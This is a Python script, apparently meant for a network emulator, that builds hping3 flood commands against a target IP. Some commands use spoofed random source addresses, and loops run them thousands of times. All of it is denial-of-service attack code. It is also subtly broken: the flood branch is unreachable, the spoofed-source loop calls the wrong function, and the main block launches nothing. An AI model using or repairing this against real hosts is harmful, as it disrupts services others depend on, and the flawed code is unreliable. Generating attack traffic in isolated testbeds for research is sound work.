import random
import os
import sys
import time

def generateDDOSTraffic(targetIP):
    rand = random.choice([1, 2, 3])
    
    if rand == 1:
        return f"timeout 5s hping3 {targetIP} -q > /dev/null 2>&1 &"
    elif rand == 2:
        return f"timeout 5s hping3 {targetIP} --fast -q > /dev/null 2>&1 &"
    elif rand == 3:
        return f"timeout 5s hping3 {targetIP} --faster -q > /dev/null 2>&1 &"
    else:
        return f"timeout 5s hping3 {targetIP} --flood -q > /dev/null 2>&1 &"



def loopGDT(hostObj, targetIP): # Loop through generateDDOSTraffic function
    i = 0
    while i < 10000:
        cmd = generateDDOSTraffic(targetIP)
        hostObj.cmd(cmd) # This does not wait for the command to complete, so time.sleep() was added to wait until current command finishes to start the next one
        time.sleep(5)
        i += 1
        


def generateDDOSTrafficSpoofedSrc(targetIP):
    rand = random.choice([1, 2, 3])
    
    if rand == 1:
        return f"timeout 5s hping3 {targetIP} --rand-source -q > /dev/null 2>&1 &"
    elif rand == 2:
        return f"timeout 5s hping3 {targetIP} --fast --rand-source -q > /dev/null 2>&1 &"
    elif rand == 3:
        return f"timeout 5s hping3 {targetIP} --faster --rand-source -q > /dev/null 2>&1 &"
    else:
        return f"timeout 5s hping3 {targetIP} --flood --rand-source -q > /dev/null 2>&1 &"



def loopGDTSS(hostObj, targetIP): # Loop through generateDDOSTrafficSpoofedSrc function
    i = 0
    while i < 10000:
        cmd = generateDDOSTraffic(targetIP)
        hostObj.cmd(cmd) # This does not wait for the command to complete, so time.sleep() was added to wait until current command finishes to start the next one
        time.sleep(5)
        i += 1



if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("\nError. Programs needs to be run as root.\n")

    target = sys.argv[1:]

    generateDDOSTraffic(target)
    